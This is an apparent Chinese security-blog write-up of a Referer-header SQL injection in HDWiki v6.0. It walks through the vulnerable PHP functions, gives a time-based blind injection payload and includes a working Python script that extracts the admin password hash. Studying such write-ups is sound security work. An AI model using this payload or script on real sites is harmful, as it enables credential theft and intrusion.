<!DOCTYPE html>
<html lang="en">

<head>
    
<meta charset="utf-8">

<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">


<title>HDWiki v6.0最新版referer注入漏洞(每周一洞) - F0rmat的博客 | 专注于网络攻防和信息安全</title>

<meta name="description" content="0x01 前言 经拖稿一个月了，差了四篇文章没补回来， 现在都补上，虽然说这样没有坚持的按时写下去，但是只要记得要做这个事情就行了，不能中途而废。这个漏洞比较鸡肋，搁现在估计都没戏了，但是这个漏洞的思路可以学习下，积累经验。
0x02 环境搭建 6.0可以在官网下载：http://kaiyuan.hudong.com/download/ 在文章底部也会附上源码，搭建就不详细说明了，在我的其他文章也有搭建的详细步骤。用到的集成环境是PHPstudy，PHP版本是5.3，开启GPC。
0x03 漏洞利用 1. 注册账号 http://sb.com/index.php?user-register
2. 截获数据包 http://sb.com/index.php?user-login, 用burp或者其他工具截取数据包。
3. 执行Payload 在数据包下面加上referer：referer:&#39; where if((substr((select password from wiki_user where username=&#39;admin&#39;),1,1))=&#39;e&#39;,sleep(5),0)# 看到burp的右下角时间比没有加上payload的时候多了5s，证明漏洞利用成功。
0x04 漏洞分析 文件control/user.php的110行dologin()函数，为什么要登录用户才有效呢，因为$_ENV[&#39;user&#39;]这里检测了cookies，所以没有用户登录是不能执行不成功的。想了解的可以进去读一下这个代码，主要存在注入的地方是在$_ENV[&#39;user&#39;]-&amp;gt;add_referer();这里。
function dologin(){ $_ENV[&amp;#39;user&amp;#39;]-&amp;gt;passport_server(&amp;#39;login&amp;#39;,&amp;#39;1&amp;#39;); if(!isset($this-&amp;gt;post[&amp;#39;submit&amp;#39;])){ $this-&amp;gt;view-&amp;gt;assign(&amp;#39;checkcode&amp;#39;,isset($this-&amp;gt;setting[&amp;#39;checkcode&amp;#39;])?$this-&amp;gt;setting[&amp;#39;checkcode&amp;#39;]:0); $_ENV[&amp;#39;user&amp;#39;]-&amp;gt;add_referer(); $_ENV[&amp;#39;user&amp;#39;]-&amp;gt;passport_server(&amp;#39;login&amp;#39;,&amp;#39;2&amp;#39;); $_ENV[&amp;#39;user&amp;#39;]-&amp;gt;passport_client(&amp;#39;login&amp;#39;); if (!isset($this-&amp;gt;setting[&amp;#39;name_min_length&amp;#39;])) {$this-&amp;gt;setting[&amp;#39;name_min_length&amp;#39;] = 3;} if (!isset($this-&amp;gt;setting[&amp;#39;name_max_length&amp;#39;])) {$this-&amp;gt;setting[&amp;#39;name_max_length&amp;#39;] = 15;} $loginTip2 = str_replace(array(&amp;#39;3&amp;#39;,&amp;#39;15&amp;#39;),array($this-&amp;gt;setting[&amp;#39;name_min_length&amp;#39;],$this-&amp;gt;setting[&amp;#39;name_max_length&amp;#39;]),$this-&amp;gt;view-&amp;gt;lang[&amp;#39;loginTip2&amp;#39;]); $this-&amp;gt;view-&amp;gt;assign(&amp;#39;name_min_length&amp;#39;,$this-&amp;gt;setting[&amp;#39;name_min_length&amp;#39;]); $this-&amp;gt;view-&amp;gt;assign(&amp;#39;name_max_length&amp;#39;,$this-&amp;gt;setting[&amp;#39;name_max_length&amp;#39;]); $this-&amp;gt;view-&amp;gt;assign(&amp;#39;loginTip2&amp;#39;,$loginTip2); //$this-&amp;gt;view-&amp;gt;display(&amp;#39;login&amp;#39;); 	$_ENV[&amp;#39;block&amp;#39;]-&amp;gt;view(&amp;#39;login&amp;#39;); }else{ 继续跟进add_referer()函数的分析，model\user.class.php的41行，这里判断了HTTP_REFERER是否为真然后执行下面内容，可以看到把$_SERVER[&#39;HTTP_REFERER&#39;]带入UPDATE语句，但是有一个haddslashes函数的过滤。
function add_referer(){ if($_SERVER[&amp;#39;HTTP_REFERER&amp;#39;]){ $this-&amp;gt;db-&amp;gt;query(&amp;#34;UPDATE &amp;#34;.DB_TABLEPRE.&amp;#34;session SET referer =&amp;#39;&amp;#34;.string::haddslashes($_SERVER[&amp;#39;HTTP_REFERER&amp;#39;]).&amp;#34;&amp;#39; WHERE sid=&amp;#39;&amp;#34;.base::hgetcookie(&amp;#39;sid&amp;#39;).&amp;#34;&amp;#39;&amp;#34;); } } 我们进入haddslashes()函数，在lib\string." /><meta name="keywords"
  content="F0rmat, 信息安全, 网络安全, 红蓝攻防, 渗透测试, bypass, waf, 注入, 黑客" />


<link rel="stylesheet" href="https://getshe11.com/css/main.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/src/css/lightgallery.css">



<meta property="og:title" content="HDWiki v6.0最新版referer注入漏洞(每周一洞)" />
<meta property="og:description" content="0x01 前言 经拖稿一个月了，差了四篇文章没补回来， 现在都补上，虽然说这样没有坚持的按时写下去，但是只要记得要做这个事情就行了，不能中途而废。这个漏洞比较鸡肋，搁现在估计都没戏了，但是这个漏洞的思路可以学习下，积累经验。
0x02 环境搭建 6.0可以在官网下载：http://kaiyuan.hudong.com/download/ 在文章底部也会附上源码，搭建就不详细说明了，在我的其他文章也有搭建的详细步骤。用到的集成环境是PHPstudy，PHP版本是5.3，开启GPC。
0x03 漏洞利用 1. 注册账号 http://sb.com/index.php?user-register
2. 截获数据包 http://sb.com/index.php?user-login, 用burp或者其他工具截取数据包。
3. 执行Payload 在数据包下面加上referer：referer:&#39; where if((substr((select password from wiki_user where username=&#39;admin&#39;),1,1))=&#39;e&#39;,sleep(5),0)# 看到burp的右下角时间比没有加上payload的时候多了5s，证明漏洞利用成功。
0x04 漏洞分析 文件control/user.php的110行dologin()函数，为什么要登录用户才有效呢，因为$_ENV[&#39;user&#39;]这里检测了cookies，所以没有用户登录是不能执行不成功的。想了解的可以进去读一下这个代码，主要存在注入的地方是在$_ENV[&#39;user&#39;]-&gt;add_referer();这里。
function dologin(){ $_ENV[&#39;user&#39;]-&gt;passport_server(&#39;login&#39;,&#39;1&#39;); if(!isset($this-&gt;post[&#39;submit&#39;])){ $this-&gt;view-&gt;assign(&#39;checkcode&#39;,isset($this-&gt;setting[&#39;checkcode&#39;])?$this-&gt;setting[&#39;checkcode&#39;]:0); $_ENV[&#39;user&#39;]-&gt;add_referer(); $_ENV[&#39;user&#39;]-&gt;passport_server(&#39;login&#39;,&#39;2&#39;); $_ENV[&#39;user&#39;]-&gt;passport_client(&#39;login&#39;); if (!isset($this-&gt;setting[&#39;name_min_length&#39;])) {$this-&gt;setting[&#39;name_min_length&#39;] = 3;} if (!isset($this-&gt;setting[&#39;name_max_length&#39;])) {$this-&gt;setting[&#39;name_max_length&#39;] = 15;} $loginTip2 = str_replace(array(&#39;3&#39;,&#39;15&#39;),array($this-&gt;setting[&#39;name_min_length&#39;],$this-&gt;setting[&#39;name_max_length&#39;]),$this-&gt;view-&gt;lang[&#39;loginTip2&#39;]); $this-&gt;view-&gt;assign(&#39;name_min_length&#39;,$this-&gt;setting[&#39;name_min_length&#39;]); $this-&gt;view-&gt;assign(&#39;name_max_length&#39;,$this-&gt;setting[&#39;name_max_length&#39;]); $this-&gt;view-&gt;assign(&#39;loginTip2&#39;,$loginTip2); //$this-&gt;view-&gt;display(&#39;login&#39;); 	$_ENV[&#39;block&#39;]-&gt;view(&#39;login&#39;); }else{ 继续跟进add_referer()函数的分析，model\user.class.php的41行，这里判断了HTTP_REFERER是否为真然后执行下面内容，可以看到把$_SERVER[&#39;HTTP_REFERER&#39;]带入UPDATE语句，但是有一个haddslashes函数的过滤。
function add_referer(){ if($_SERVER[&#39;HTTP_REFERER&#39;]){ $this-&gt;db-&gt;query(&#34;UPDATE &#34;.DB_TABLEPRE.&#34;session SET referer =&#39;&#34;.string::haddslashes($_SERVER[&#39;HTTP_REFERER&#39;]).&#34;&#39; WHERE sid=&#39;&#34;.base::hgetcookie(&#39;sid&#39;).&#34;&#39;&#34;); } } 我们进入haddslashes()函数，在lib\string." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://getshe11.com/post/hdwiki-v6.0_latest_version_of_referer_injection_vulnerability/" />
<meta property="article:published_time" content="2018-07-22T17:13:30+00:00" />
<meta property="article:modified_time" content="2018-07-22T17:13:30+00:00" />
<meta itemprop="name" content="HDWiki v6.0最新版referer注入漏洞(每周一洞)">
<meta itemprop="description" content="0x01 前言 经拖稿一个月了，差了四篇文章没补回来， 现在都补上，虽然说这样没有坚持的按时写下去，但是只要记得要做这个事情就行了，不能中途而废。这个漏洞比较鸡肋，搁现在估计都没戏了，但是这个漏洞的思路可以学习下，积累经验。
0x02 环境搭建 6.0可以在官网下载：http://kaiyuan.hudong.com/download/ 在文章底部也会附上源码，搭建就不详细说明了，在我的其他文章也有搭建的详细步骤。用到的集成环境是PHPstudy，PHP版本是5.3，开启GPC。
0x03 漏洞利用 1. 注册账号 http://sb.com/index.php?user-register
2. 截获数据包 http://sb.com/index.php?user-login, 用burp或者其他工具截取数据包。
3. 执行Payload 在数据包下面加上referer：referer:&#39; where if((substr((select password from wiki_user where username=&#39;admin&#39;),1,1))=&#39;e&#39;,sleep(5),0)# 看到burp的右下角时间比没有加上payload的时候多了5s，证明漏洞利用成功。
0x04 漏洞分析 文件control/user.php的110行dologin()函数，为什么要登录用户才有效呢，因为$_ENV[&#39;user&#39;]这里检测了cookies，所以没有用户登录是不能执行不成功的。想了解的可以进去读一下这个代码，主要存在注入的地方是在$_ENV[&#39;user&#39;]-&gt;add_referer();这里。
function dologin(){ $_ENV[&#39;user&#39;]-&gt;passport_server(&#39;login&#39;,&#39;1&#39;); if(!isset($this-&gt;post[&#39;submit&#39;])){ $this-&gt;view-&gt;assign(&#39;checkcode&#39;,isset($this-&gt;setting[&#39;checkcode&#39;])?$this-&gt;setting[&#39;checkcode&#39;]:0); $_ENV[&#39;user&#39;]-&gt;add_referer(); $_ENV[&#39;user&#39;]-&gt;passport_server(&#39;login&#39;,&#39;2&#39;); $_ENV[&#39;user&#39;]-&gt;passport_client(&#39;login&#39;); if (!isset($this-&gt;setting[&#39;name_min_length&#39;])) {$this-&gt;setting[&#39;name_min_length&#39;] = 3;} if (!isset($this-&gt;setting[&#39;name_max_length&#39;])) {$this-&gt;setting[&#39;name_max_length&#39;] = 15;} $loginTip2 = str_replace(array(&#39;3&#39;,&#39;15&#39;),array($this-&gt;setting[&#39;name_min_length&#39;],$this-&gt;setting[&#39;name_max_length&#39;]),$this-&gt;view-&gt;lang[&#39;loginTip2&#39;]); $this-&gt;view-&gt;assign(&#39;name_min_length&#39;,$this-&gt;setting[&#39;name_min_length&#39;]); $this-&gt;view-&gt;assign(&#39;name_max_length&#39;,$this-&gt;setting[&#39;name_max_length&#39;]); $this-&gt;view-&gt;assign(&#39;loginTip2&#39;,$loginTip2); //$this-&gt;view-&gt;display(&#39;login&#39;); 	$_ENV[&#39;block&#39;]-&gt;view(&#39;login&#39;); }else{ 继续跟进add_referer()函数的分析，model\user.class.php的41行，这里判断了HTTP_REFERER是否为真然后执行下面内容，可以看到把$_SERVER[&#39;HTTP_REFERER&#39;]带入UPDATE语句，但是有一个haddslashes函数的过滤。
function add_referer(){ if($_SERVER[&#39;HTTP_REFERER&#39;]){ $this-&gt;db-&gt;query(&#34;UPDATE &#34;.DB_TABLEPRE.&#34;session SET referer =&#39;&#34;.string::haddslashes($_SERVER[&#39;HTTP_REFERER&#39;]).&#34;&#39; WHERE sid=&#39;&#34;.base::hgetcookie(&#39;sid&#39;).&#34;&#39;&#34;); } } 我们进入haddslashes()函数，在lib\string.">
<meta itemprop="datePublished" content="2018-07-22T17:13:30+00:00" />
<meta itemprop="dateModified" content="2018-07-22T17:13:30+00:00" />
<meta itemprop="wordCount" content="182">



<meta itemprop="keywords" content="HDWiki,每周一洞,代码审计,SQL注入," />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="HDWiki v6.0最新版referer注入漏洞(每周一洞)"/>
<meta name="twitter:description" content="0x01 前言 经拖稿一个月了，差了四篇文章没补回来， 现在都补上，虽然说这样没有坚持的按时写下去，但是只要记得要做这个事情就行了，不能中途而废。这个漏洞比较鸡肋，搁现在估计都没戏了，但是这个漏洞的思路可以学习下，积累经验。
0x02 环境搭建 6.0可以在官网下载：http://kaiyuan.hudong.com/download/ 在文章底部也会附上源码，搭建就不详细说明了，在我的其他文章也有搭建的详细步骤。用到的集成环境是PHPstudy，PHP版本是5.3，开启GPC。
0x03 漏洞利用 1. 注册账号 http://sb.com/index.php?user-register
2. 截获数据包 http://sb.com/index.php?user-login, 用burp或者其他工具截取数据包。
3. 执行Payload 在数据包下面加上referer：referer:&#39; where if((substr((select password from wiki_user where username=&#39;admin&#39;),1,1))=&#39;e&#39;,sleep(5),0)# 看到burp的右下角时间比没有加上payload的时候多了5s，证明漏洞利用成功。
0x04 漏洞分析 文件control/user.php的110行dologin()函数，为什么要登录用户才有效呢，因为$_ENV[&#39;user&#39;]这里检测了cookies，所以没有用户登录是不能执行不成功的。想了解的可以进去读一下这个代码，主要存在注入的地方是在$_ENV[&#39;user&#39;]-&gt;add_referer();这里。
function dologin(){ $_ENV[&#39;user&#39;]-&gt;passport_server(&#39;login&#39;,&#39;1&#39;); if(!isset($this-&gt;post[&#39;submit&#39;])){ $this-&gt;view-&gt;assign(&#39;checkcode&#39;,isset($this-&gt;setting[&#39;checkcode&#39;])?$this-&gt;setting[&#39;checkcode&#39;]:0); $_ENV[&#39;user&#39;]-&gt;add_referer(); $_ENV[&#39;user&#39;]-&gt;passport_server(&#39;login&#39;,&#39;2&#39;); $_ENV[&#39;user&#39;]-&gt;passport_client(&#39;login&#39;); if (!isset($this-&gt;setting[&#39;name_min_length&#39;])) {$this-&gt;setting[&#39;name_min_length&#39;] = 3;} if (!isset($this-&gt;setting[&#39;name_max_length&#39;])) {$this-&gt;setting[&#39;name_max_length&#39;] = 15;} $loginTip2 = str_replace(array(&#39;3&#39;,&#39;15&#39;),array($this-&gt;setting[&#39;name_min_length&#39;],$this-&gt;setting[&#39;name_max_length&#39;]),$this-&gt;view-&gt;lang[&#39;loginTip2&#39;]); $this-&gt;view-&gt;assign(&#39;name_min_length&#39;,$this-&gt;setting[&#39;name_min_length&#39;]); $this-&gt;view-&gt;assign(&#39;name_max_length&#39;,$this-&gt;setting[&#39;name_max_length&#39;]); $this-&gt;view-&gt;assign(&#39;loginTip2&#39;,$loginTip2); //$this-&gt;view-&gt;display(&#39;login&#39;); 	$_ENV[&#39;block&#39;]-&gt;view(&#39;login&#39;); }else{ 继续跟进add_referer()函数的分析，model\user.class.php的41行，这里判断了HTTP_REFERER是否为真然后执行下面内容，可以看到把$_SERVER[&#39;HTTP_REFERER&#39;]带入UPDATE语句，但是有一个haddslashes函数的过滤。
function add_referer(){ if($_SERVER[&#39;HTTP_REFERER&#39;]){ $this-&gt;db-&gt;query(&#34;UPDATE &#34;.DB_TABLEPRE.&#34;session SET referer =&#39;&#34;.string::haddslashes($_SERVER[&#39;HTTP_REFERER&#39;]).&#34;&#39; WHERE sid=&#39;&#34;.base::hgetcookie(&#39;sid&#39;).&#34;&#39;&#34;); } } 我们进入haddslashes()函数，在lib\string."/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->
</head>

<body>
    <div class="header-placeholder"></div>
    
    <header class="header">
        <div class="wrapper">
    <div id="sidebar-toggle">TOC</div>
    
    <a class="site-title" href="https://getshe11.com/.">F0rmat</a>
    
    <nav class="site-nav">
        <a class="page-link" href="/">Home</a><a class="page-link" href="/post/">Category</a>
    </nav>
</div>

    </header>

    
    <div class="page-content">
        <div class="wrapper">
            
            <div class="col-main">
                <div class="post">
    
    <header class="post-header">
        <h1 class="post-title">HDWiki V6.0最新版referer注入漏洞(每周一洞)</h1>
        <p class="post-meta">Jul 22, 2018</p>
    </header>
    <article class="post-content">
        
        
        
        
        
        
        <h1 id="0x01-前言">0x01 前言</h1>
<p>经拖稿一个月了，差了四篇文章没补回来， 现在都补上，虽然说这样没有坚持的按时写下去，但是只要记得要做这个事情就行了，不能中途而废。这个漏洞比较鸡肋，搁现在估计都没戏了，但是这个漏洞的思路可以学习下，积累经验。</p>
<h1 id="0x02-环境搭建">0x02 环境搭建</h1>
<p>6.0可以在官网下载：http://kaiyuan.hudong.com/download/
在文章底部也会附上源码，搭建就不详细说明了，在我的其他文章也有搭建的详细步骤。用到的集成环境是PHPstudy，PHP版本是5.3，开启GPC。</p>
<!-- raw HTML omitted -->
<h1 id="0x03-漏洞利用">0x03 漏洞利用</h1>
<h2 id="1-注册账号">1. 注册账号</h2>
<p><a href="http://sb.com/index.php?user-register">http://sb.com/index.php?user-register</a></p>
<h2 id="2-截获数据包">2. 截获数据包</h2>
<p><a href="http://sb.com/index.php?user-login,">http://sb.com/index.php?user-login,</a>
用burp或者其他工具截取数据包。</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/HDWiki6/1.png" alt=""></p>
<h2 id="3-执行payload">3. 执行Payload</h2>
<p>在数据包下面加上referer：<code>referer:' where if((substr((select password from wiki_user where username='admin'),1,1))='e',sleep(5),0)#</code>
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/HDWiki6/2.PNG" alt="">
看到burp的右下角时间比没有加上payload的时候多了5s，证明漏洞利用成功。</p>
<h1 id="0x04-漏洞分析">0x04 漏洞分析</h1>
<p>文件<code>control/user.php</code>的110行<code>dologin()</code>函数，为什么要登录用户才有效呢，因为<code>$_ENV['user']</code>这里检测了cookies，所以没有用户登录是不能执行不成功的。想了解的可以进去读一下这个代码，主要存在注入的地方是在<code>$_ENV['user']-&gt;add_referer();</code>这里。</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">dologin</span><span class="p">(){</span>
		
		<span class="nv">$_ENV</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">passport_server</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">);</span>
		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])){</span>
			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">view</span><span class="o">-&gt;</span><span class="na">assign</span><span class="p">(</span><span class="s1">&#39;checkcode&#39;</span><span class="p">,</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setting</span><span class="p">[</span><span class="s1">&#39;checkcode&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setting</span><span class="p">[</span><span class="s1">&#39;checkcode&#39;</span><span class="p">]</span><span class="o">:</span><span class="mi">0</span><span class="p">);</span>

			<span class="nv">$_ENV</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">add_referer</span><span class="p">();</span>
			<span class="nv">$_ENV</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">passport_server</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">,</span><span class="s1">&#39;2&#39;</span><span class="p">);</span>
			<span class="nv">$_ENV</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">passport_client</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">);</span>

			<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setting</span><span class="p">[</span><span class="s1">&#39;name_min_length&#39;</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setting</span><span class="p">[</span><span class="s1">&#39;name_min_length&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;}</span>
			<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setting</span><span class="p">[</span><span class="s1">&#39;name_max_length&#39;</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setting</span><span class="p">[</span><span class="s1">&#39;name_max_length&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">15</span><span class="p">;}</span>
			<span class="nv">$loginTip2</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">,</span><span class="s1">&#39;15&#39;</span><span class="p">),</span><span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setting</span><span class="p">[</span><span class="s1">&#39;name_min_length&#39;</span><span class="p">],</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setting</span><span class="p">[</span><span class="s1">&#39;name_max_length&#39;</span><span class="p">]),</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">view</span><span class="o">-&gt;</span><span class="na">lang</span><span class="p">[</span><span class="s1">&#39;loginTip2&#39;</span><span class="p">]);</span>
			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">view</span><span class="o">-&gt;</span><span class="na">assign</span><span class="p">(</span><span class="s1">&#39;name_min_length&#39;</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setting</span><span class="p">[</span><span class="s1">&#39;name_min_length&#39;</span><span class="p">]);</span>
			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">view</span><span class="o">-&gt;</span><span class="na">assign</span><span class="p">(</span><span class="s1">&#39;name_max_length&#39;</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setting</span><span class="p">[</span><span class="s1">&#39;name_max_length&#39;</span><span class="p">]);</span>
			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">view</span><span class="o">-&gt;</span><span class="na">assign</span><span class="p">(</span><span class="s1">&#39;loginTip2&#39;</span><span class="p">,</span><span class="nv">$loginTip2</span><span class="p">);</span>
			<span class="c1">//$this-&gt;view-&gt;display(&#39;login&#39;);
</span><span class="c1"></span>			<span class="nv">$_ENV</span><span class="p">[</span><span class="s1">&#39;block&#39;</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">view</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">);</span>
		<span class="p">}</span><span class="k">else</span><span class="p">{</span>
</code></pre></div><p>继续跟进<code>add_referer()</code>函数的分析，<code>model\user.class.php</code>的41行，这里判断了<code>HTTP_REFERER</code>是否为真然后执行下面内容，可以看到把<code>$_SERVER['HTTP_REFERER']</code>带入UPDATE语句，但是有一个<code>haddslashes</code>函数的过滤。</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">	<span class="k">function</span> <span class="nf">add_referer</span><span class="p">(){</span>
		<span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_REFERER&#39;</span><span class="p">]){</span>
			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&#34;UPDATE &#34;</span><span class="o">.</span><span class="nx">DB_TABLEPRE</span><span class="o">.</span><span class="s2">&#34;session SET referer =&#39;&#34;</span><span class="o">.</span><span class="nx">string</span><span class="o">::</span><span class="na">haddslashes</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_REFERER&#39;</span><span class="p">])</span><span class="o">.</span><span class="s2">&#34;&#39; WHERE sid=&#39;&#34;</span><span class="o">.</span><span class="nx">base</span><span class="o">::</span><span class="na">hgetcookie</span><span class="p">(</span><span class="s1">&#39;sid&#39;</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;&#39;&#34;</span><span class="p">);</span>
		<span class="p">}</span>
	<span class="p">}</span>
</code></pre></div><p>我们进入<code>haddslashes()</code>函数，在<code>lib\string.class.php</code>文件的125行，可以看到<code>MAGIC_QUOTES_GPC </code>如果PHP开启了GPC，那就不进行下面的过滤直接返回原字符串<code>$string</code>，所以就造成了SQL注入。</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">haddslashes</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="nv">$force</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">MAGIC_QUOTES_GPC</span> <span class="o">||</span> <span class="nv">$force</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">if</span><span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$string</span><span class="p">))</span> <span class="p">{</span>
				<span class="k">foreach</span><span class="p">(</span><span class="nv">$string</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
					<span class="nv">$string</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">string</span><span class="o">::</span><span class="na">haddslashes</span><span class="p">(</span><span class="nv">$val</span><span class="p">,</span> <span class="nv">$force</span><span class="p">);</span>
				<span class="p">}</span>
			<span class="p">}</span><span class="k">else</span> <span class="p">{</span>
				<span class="nv">$string</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span>
			<span class="p">}</span>
		<span class="p">}</span>
		<span class="k">return</span> <span class="nv">$string</span><span class="p">;</span>
	<span class="p">}</span>
</code></pre></div><h1 id="0x05-python脚本">0x05 Python脚本</h1>
<p>因为是盲注所以还是脚本跑比较省事，改进了一下原作者的脚本。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/HDWiki6/3.png" alt=""></p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">#coding:utf-8</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">httplib</span>
<span class="n">payloads</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="s1">&#39;1234567890abcdefghijklmnopqrstuvwxyz&#39;</span><span class="p">)</span><span class="c1">#匹配用到的字符串</span>
<span class="n">val</span> <span class="o">=</span><span class="s1">&#39;&#39;</span>
<span class="n">Cookies</span> <span class="o">=</span> <span class="s1">&#39;hd_sid=pUQ1Aq; PHPSESSID=jatvti3nlm2ro3i7oscke307e0; hd_auth=fa04EhT6qA%2BHMlu7IOesKoc8Xs</span><span class="si">%2F</span><span class="s1">5b</span><span class="si">%2F</span><span class="s1">d18B4obJ17nm7F%2BvPbknFWVkAx1u4CLLl75EzncqWZRI94cSDMjJEV&#39;</span>
<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;/index.php?user-login&#39;</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">32</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">payload</span> <span class="ow">in</span> <span class="n">payloads</span><span class="p">:</span>
        <span class="n">header</span> <span class="o">=</span><span class="p">{</span>
            <span class="s1">&#39;Cookie&#39;</span><span class="p">:</span><span class="n">Cookies</span><span class="p">,</span>
            <span class="s1">&#39;referer&#39;</span><span class="p">:</span><span class="s2">&#34;&#39;where if(substr((select password from wiki_user where username=&#39;admin&#39;),&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;,1)=&#39;&#34;</span><span class="o">+</span><span class="n">payload</span><span class="o">+</span><span class="s2">&#34;&#39;,sleep(3),0)#&#34;</span><span class="p">,</span>
        <span class="p">}</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">conn</span> <span class="o">=</span> <span class="n">httplib</span><span class="o">.</span><span class="n">HTTPConnection</span><span class="p">(</span><span class="s1">&#39;sb.com&#39;</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
            <span class="n">conn</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="n">method</span><span class="o">=</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">)</span>
            <span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">clock</span><span class="p">()</span>
            <span class="n">html_doc</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">getresponse</span><span class="p">()</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
            <span class="n">end</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">clock</span><span class="p">()</span>
            <span class="n">dely</span><span class="o">=</span><span class="n">end</span><span class="o">-</span><span class="n">start</span>
            <span class="c1">#print dely</span>
            <span class="k">if</span><span class="p">((</span><span class="n">dely</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">2</span><span class="p">):</span>
                <span class="n">val</span><span class="o">+=</span><span class="n">payload</span>
                <span class="k">break</span>
        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="k">pass</span>
        <span class="k">finally</span><span class="p">:</span>
            <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

